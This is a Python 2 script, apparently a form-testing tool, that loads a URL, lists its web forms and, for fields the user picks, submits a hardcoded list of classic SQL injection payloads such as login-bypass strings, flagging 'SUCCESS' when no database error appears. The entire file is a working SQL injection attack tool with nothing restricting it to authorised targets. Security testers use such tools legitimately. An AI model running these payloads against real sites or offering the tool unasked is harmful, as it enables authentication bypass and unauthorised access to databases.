#!/usr/bin/python

import sys
import argparse
import urllib
import mechanize

def PlusPrint(text):
    print '[+] ' + text

def PlusLine():
    print ''
def CreateHLs(leng):
    print '-' * (leng + 4)


def Interract(text, default):
    ans = raw_input('%s [%s]: ' % (text, default))
    return ans if len(ans) != 0 else default
def IsYes(text):
    text = text.lower()
    return True if text.startswith('y') else False
def IsNo(text):
    text = text.lower()
    return True if text.startswith('n') else False

sysArgParser = argparse.ArgumentParser(description='Tests forms for basic SQL injection.')
sysArgParser.add_argument('--version', action='version', version='%(prog)s is at version 1.0.0')
sysArgParser.add_argument('url', metavar='url', type=str, help='The URL containing the form to test.')
sysArgs = sysArgParser.parse_args()

INJECTION_STRINGS = ['admin\'--', '\' or 0=0 --', '" or 0=0 --', 'or 0=0 --', '\' or 0=0 #',
                     '" or 0=0 #', 'or 0=0 #', '\' or \'x\'=\'x', '" or "x"="x',
                     '\') or (\'x\'=\'x', '\' or 1=1--', '" or 1=1--', 'or 1=1--',
                     '\' or a=a--', '" or "a"="a', '\') or (\'a\'=\'a', '") or ("a"="a',
                     'hi" or "a"="a', 'hi" or 1=1 --', 'hi\' or 1=1 --', 'hi\' or \'a\'=\'a',
                     'hi\') or (\'a\'=\'a', 'hi") or ("a"="a']
ERROR_STRINGS = ['You have an error in your SQL syntax', 'document.getElementById("id-bad-cred-tr").style.display=""']


def main():
    global sysArgs
    global INJECTION_STRINGS

    PlusPrint('OWASP A1 SQL INJECTION.')

    br = mechanize.Browser()
    br.open(sysArgs.url)

    form_number = -1
    allForms = br.forms()

    for form in allForms:
        form_number += 1

        PlusLine()
        print form
        PlusLine()
        if IsYes(Interract('Attack this form?', 'yes')):            

            formValues = GetValues(form)            

            # THIS IS WHERE THE REAL MAGIC HAPPENS!
            for attack in INJECTION_STRINGS:
                br.select_form(nr=form_number)

                for key, value in formValues.iteritems():
                    if value == None:
                        br.form[key] = attack
                    else:
                        br.form[key] = value

                resp = br.submit()
                resp = resp.get_data()

                # Check if we got any MySQL errors...
                errorFound = False
                for error in ERROR_STRINGS:
                    if resp.count(error) > 0:
                        errorFound = True

                if errorFound != True:
                    msg = 'SUCCESS! We *may* have had some luck with the attack: %s' % attack
                    CreateHLs(len(msg))
                    PlusPrint(msg)
                    CreateHLs(len(msg))

                    if IsNo(Interract('Keep trying other attacks?', 'no')):
                        br.back()
                        break

                br.back()
        else:
            PlusPrint('Form Ignored, trying next...')

    PlusPrint('That\'s it! All forms have been processed.')

def GetValues(form):
    attrs = {}
    for control in form.controls:
        if (control.type == 'text') or (control.type == 'password'):
            ans = Interract('Type yes to attack (%s), otherwise type a value.' % control.name, 'yes')
            if IsYes(ans):
                attrs[control.name] = None
            else:
                attrs[control.name] = ans
    return attrs

def exit():    
    sys.exit()

def interrupt():
    PlusPrint('\nGood-byte.')

def run(main, exit, interrupt):
    try:
        main()
    except KeyboardInterrupt:
        interrupt()
    finally:
        exit()

if __name__ == '__main__':
    run(main, exit, interrupt)